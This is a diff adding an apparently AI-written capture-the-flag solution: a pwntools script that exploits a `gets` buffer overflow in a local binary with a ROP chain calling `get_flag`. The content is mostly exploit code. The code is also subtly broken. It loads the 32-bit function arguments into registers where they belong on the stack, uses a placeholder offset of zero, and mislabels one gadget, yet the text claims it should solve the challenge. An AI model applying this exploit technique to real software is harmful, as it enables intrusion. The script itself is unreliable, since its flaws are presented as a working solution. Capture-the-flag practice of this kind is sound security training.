@@ -1,0 +1,72 @@
+To solve this CTF challenge using `pwntools`, we need to exploit the vulnerability in the `main` function, which uses `gets` to read user input without bounds checking. This makes it susceptible to a buffer overflow attack. We can use Return-Oriented Programming (ROP) to control the execution flow and call the `get_flag` function with the correct arguments.
+
+Here are the steps and code to solve this challenge:
+
+### Steps:
+1. **Identify the Vulnerability**: The `main` function uses `gets` to read input into a fixed-size buffer (`v5[56]`), making it vulnerable to a buffer overflow.
+2. **Find the Offset**: Determine the offset to the return address on the stack.
+3. **Find Useful Gadgets**: Use the gadgets found by `ROPgadget` to build the ROP chain.
+4. **Call `get_flag`**: Construct the ROP chain to call `get_flag` with the correct arguments (`814536271` and `425138641`).
+5. **Exploit the Vulnerability**: Send the payload to the binary to execute the ROP chain.
+
+### Code:
+
+```python
+from pwn import *
+
+# Set up the context for the binary
+binary_path = './rop'
+elf = context.binary = ELF(binary_path)
+
+# Start the process
+p = process(binary_path)
+
+# Find the offset to the return address
+offset = cyclic_find(0x61616161)  # Replace with the actual offset found using pattern_create and pattern_offset
+
+# Find the address of the get_flag function
+get_flag_addr = elf.symbols['get_flag']
+
+# Find useful gadgets
+pop_eax = 0x080b91e6  # pop eax ; ret
+pop_ebx = 0x080481ad  # pop ebx ; ret
+pop_ecx = 0x0806fc31  # pop ecx ; pop ebx ; ret
+pop_edx = 0x0806fc0a  # pop edx ; ret
+pop_edi = 0x0805099d  # pop edi ; ret
+pop_esi = 0x080509a5  # pop ebx ; pop esi ; pop edi ; ret
+
+# Build the ROP chain
+rop_chain = [
+    pop_eax, 814536271,  # First argument to get_flag
+    pop_ebx, 425138641,  # Second argument to get_flag
+    get_flag_addr       # Call get_flag
+]
+
+# Convert the ROP chain to bytes
+payload = flat({
+    offset: rop_chain
+})
+
+# Send the payload
+p.sendline(payload)
+
+# Receive and print the flag
+p.interactive()
+```
+
+### Explanation:
+1. **Context Setup**: We set up the context for the binary using `ELF` from `pwntools`.
+2. **Process Start**: We start the process using `process`.
+3. **Offset Finding**: We use `cyclic_find` to determine the offset to the return address. You might need to use `pattern_create` and `pattern_offset` to find the exact offset.
+4. **Function Address**: We find the address of the `get_flag` function using `elf.symbols`.
+5. **Gadget Selection**: We select useful gadgets from the list provided by `ROPgadget`.
+6. **ROP Chain Construction**: We build the ROP chain to set the arguments for `get_flag` and call the function.
+7. **Payload Sending**: We send the payload to the binary.
+8. **Interactive Mode**: We use `p.interactive()` to interact with the process and receive the flag.
+
+### Note:
+- Ensure you have the correct offset. You can use `pattern_create` and `pattern_offset` to find the exact offset.
+- Adjust the gadget addresses if necessary based on the actual binary.
+- Run the script in a controlled environment to avoid any unintended consequences.
+
+This should help you solve the challenge and obtain the flag.
